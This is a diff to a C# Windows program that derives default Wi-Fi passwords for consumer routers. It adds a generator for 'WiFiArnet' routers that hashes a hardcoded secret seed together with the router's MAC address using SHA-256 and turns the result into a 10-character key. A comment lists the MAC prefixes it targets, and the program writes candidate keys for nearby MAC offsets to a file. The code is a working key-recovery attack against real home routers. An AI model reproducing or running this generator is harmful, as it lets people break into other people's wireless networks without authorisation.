@@ -30,6 +30,8 @@ namespace Proyecto_Windows
         private const string MIN_ALPHABET = "abcdefghijklmnopqrstuvwxyz";
         private const string charsTPlinkPureNetwork = "2345678923456789ABCDEFGHJKLMNPQRSTUVWXYZ";
 
+        readonly static char[] alphabetlower ={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i',
+                                  'j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
         public enum opcio { WEP, WPA };
         public enum generadores
         {
@@ -57,6 +59,7 @@ namespace Proyecto_Windows
             EasyBox_es,
             EasyBox_de,
             Belkin4xx,
+            WiFiArnetXXXX,
             other,
             none
 
@@ -107,24 +110,16 @@ namespace Proyecto_Windows
 
         public void Set_File(string file)
         {
+#pragma warning disable
             this.archivo = file;
-            using (StreamWriter abc = new StreamWriter(file)) ;           
+            using (StreamWriter abc = new StreamWriter(file)) ;
+#pragma warning restore
+
         }
 
 
         #region funciones auxiliares
-        /*--------------------------------------------------------
-         * is_hex funcion para decir si un string es "hexadecimal"
-         *--------------------------------------------------------
-         */
-        /*private bool is_Hex(char c)
-        {
-            bool X = false;
-            foreach (char CC in HEX)
-                if (CC == c) X = true;
-
-            return X;
-        }*/
+       
         public bool is_hex(string str)
         {
             int j; bool ret = true;
@@ -211,7 +206,19 @@ namespace Proyecto_Windows
                 str3 = str3 + str2[i].ToString();
             }
             return str3 + str;
+
         }
+        /** Transformacion de String a byte array **/
+        public static byte[] StringToByteArray(String hex)
+        {
+            int NumberChars = hex.Length;
+            byte[] bytes = new byte[NumberChars / 2];
+            for (int i = 0; i < NumberChars; i += 2)
+                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+            return bytes;
+        }
+
+
 
         /* ----------------------------------------
          * Primer digito hexadecimal de un caracter
@@ -263,7 +270,23 @@ namespace Proyecto_Windows
 
             return ret;
         }
+        /* -----------------------------
+         * Calcula el SHA256 de una cadena de bytes
+         * -----------------------------
+         */
 
+        public static string getHashSha256(byte[] bytes, out byte[] hash)
+        {
+            SHA256Managed hashstring = new SHA256Managed();
+            hash = hashstring.ComputeHash(bytes);
+            StringBuilder sb = new StringBuilder();
+            foreach (byte x in hash)
+            {
+                sb.AppendFormat("{0:x2}", x);
+            }
+
+            return sb.ToString();
+        }
 
 
         /* -----------------------------
@@ -1846,10 +1869,72 @@ namespace Proyecto_Windows
         }
         #endregion
 
+        #region WifiArnet
 
+        static string AddIntToMAC(string MAC, int i)
+        {
+            string hex = MAC.Replace(":", "");
+            long macAsNumber = Convert.ToInt64(hex, 16);
+            macAsNumber = macAsNumber + i;
+            return macAsNumber.ToString("X12");
+        }
+        public static byte[] CombineWifiArnet(byte[] third)
+        {
+            byte[] ret = new byte[seed.Length + seed2.Length + third.Length];
+            Buffer.BlockCopy(seed, 0, ret, 0, seed.Length);
+            Buffer.BlockCopy(seed2, 0, ret, seed.Length, seed2.Length);
+            Buffer.BlockCopy(third, 0, ret, seed.Length + seed2.Length,
+                             third.Length);
+            return ret;
+        }
 
+        readonly static byte[] seed = {0x64,0xC6,0xDD,0xE3,0xE5,0x79,0xB6,0xD9,0x86,0x96,0x8D,0x34,0x45,0xD2,0x3B,0x15,
+                                0xCA,0xAF,0x12,0x84,0x02,0xAC,0x56,0x00,0x05,0xCE,0x20,0x75,0x91,0x3F,0xDC,0xE8};
+        static byte[] seed2;
 
+        public static char[] GenKeyWifiArnet(string MAC)
+        {
+            byte[] shadigest = CombineWifiArnet(StringToByteArray(MAC));
+            byte[] sha256;
+            string sha256str = getHashSha256(shadigest, out sha256);
+            Console.WriteLine("SHA256:" + sha256str);
+            char[] key = new char[10];
+            for (int x = 0; x < 10; x++)
+            {
+                key[x] = alphabetlower[sha256[x] % alphabetlower.Length];
 
+            }
+            return key;
+
+        
+        
+        }
+
+        /*     
+         * targets = ['00:08:27','00:13:C8','00:17:C2','00:19:3E','00:1C:A2','00:1D:8B','00:22:33','00:8C:54',
+                '30:39:F2','74:88:8B','84:26:15','A4:52:6F','A4:5D:A1','D0:D4:12','D4:D1:84','DC:0B:1A','F0:84:2F']
+        */
+        public void WiFiArnetXXXX(string MAC,bool printallkeys) {
+            using (StreamWriter writer = new StreamWriter(archivo))
+            {
+                seed2 = Encoding.ASCII.GetBytes("1236790");
+
+                if (!printallkeys)
+                {
+                    writer.WriteLine(GenKeyWifiArnet(AddIntToMAC(MAC, 0)));
+
+                }
+                else
+                {
+                    for (int i = -2; i <= 5; i++)
+                    {
+                        writer.WriteLine(GenKeyWifiArnet(AddIntToMAC(MAC, i)));
+                    }
+                }
+            }
+        
+        }
+        #endregion
         #region backgroundworker StartGame DoWork Complete
         public void startGame(string ESSID, string MAC, opcio opc, bool claves, bool anio, bool BelkinAllKeys1)
         {
@@ -2303,7 +2388,15 @@ namespace Proyecto_Windows
                     else { error1("MAC no soportada", "Error", 15); ERROR = true; }
 
                     break;
+                case Generadores.generadores.WiFiArnetXXXX:
+                    if (isValidMac)
+                    {
+                        this.WiFiArnetXXXX(MAC, BelkinAllKeys);
+                    }
+                    else { error1("MAC no soportada", "Error", 15); ERROR = true; }
 
+                    break;
+                      
 
                 default:
 
